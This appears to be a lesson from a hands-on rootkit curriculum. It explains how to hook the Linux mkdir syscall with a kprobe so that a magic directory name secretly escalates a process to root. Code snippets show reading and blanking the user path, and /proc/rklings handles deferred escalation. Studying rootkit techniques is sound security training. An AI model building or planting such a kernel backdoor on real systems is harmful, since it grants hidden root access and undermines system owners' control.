# Open rklings_hook.h and understand kprobes

You have used `rklings_hook.h` as a black box through L05, L06, and L07.
Now open it, understand every line, and rewrite the interception from
scratch using `register_kprobe` directly.

## What the header was hiding

The header registered a **kprobe** on `__x64_sys_mkdir`. A kprobe plants a
breakpoint at the start of a kernel function and fires your `pre_handler`
before the function body runs. The flow looks like this:

```
userspace: mkdir("rklings.e")
       |
       v
__x64_sys_mkdir(struct pt_regs *regs)
       |
  [kprobe fires]
       |
       v
your pre_handler(struct kprobe *p, struct pt_regs *regs)
  1. extract inner pt_regs (the syscall's argument)
  2. read the pathname from userspace
  3. check prefix, dispatch action
  4. nullify the pathname so real mkdir sees ""
       |
       v
__x64_sys_mkdir runs on empty path, fails harmlessly
```

## The nested pt_regs trick

`__x64_sys_mkdir` is a syscall wrapper whose only argument is a
`struct pt_regs *` holding the original register state. Your kprobe's
`pre_handler` also receives a `struct pt_regs *`, but this one is the
kprobe trap frame, not the syscall registers.

To reach the actual syscall arguments:

```c
// Step 1: extract the inner pt_regs (first argument to __x64_sys_mkdir)
struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);

// Step 2: read RDI (first syscall argument: the pathname pointer)
const char __user *pathname = (const char __user *)uregs->di;
```

## Copying the pathname safely

The pathname lives in userspace memory. Use `strncpy_from_user` to copy it
into a kernel buffer:

```c
char buf[128];
long copied = strncpy_from_user(buf, pathname, sizeof(buf));
```

Returns the number of bytes copied (not counting the null terminator), or
a negative error. After copying, extract the basename with `strrchr`:

```c
const char *base = strrchr(buf, '/');
base = base ? base + 1 : buf;
```

## Suppressing the real mkdir

Write a null byte to the start of the userspace path. The real mkdir sees
an empty string and fails with ENOENT, which is harmless:

```c
put_user('\0', (char __user *)pathname);
```

## Deferred PID delivery with /proc/rklings

When you run `mkdir rklings.e.1234` but PID 1234 does not exist yet, store
the PID. Create a `/proc/rklings` entry using `proc_create_single_seq_show`
that displays the pending PID. When the target process appears and something
reads `/proc/rklings`, attempt the deferred escalation.

## Your task

1. Read `curriculum/include/rklings_hook.h` completely
2. Write a `pre_handler` that extracts the nested pt_regs
3. Copy the pathname with `strncpy_from_user`
4. Check for the "rklings." prefix, dispatch escalation
5. Nullify the pathname with `put_user`
6. Register the kprobe on `__x64_sys_mkdir`
7. Create `/proc/rklings` for deferred PID delivery

Everything you need is in the starter file as TODO comments. Fill in each
function body.

## Verify

```sh
$ mkdir rklings.e && id
uid=0(root)
```

Run:

```sh
./rklings check
```
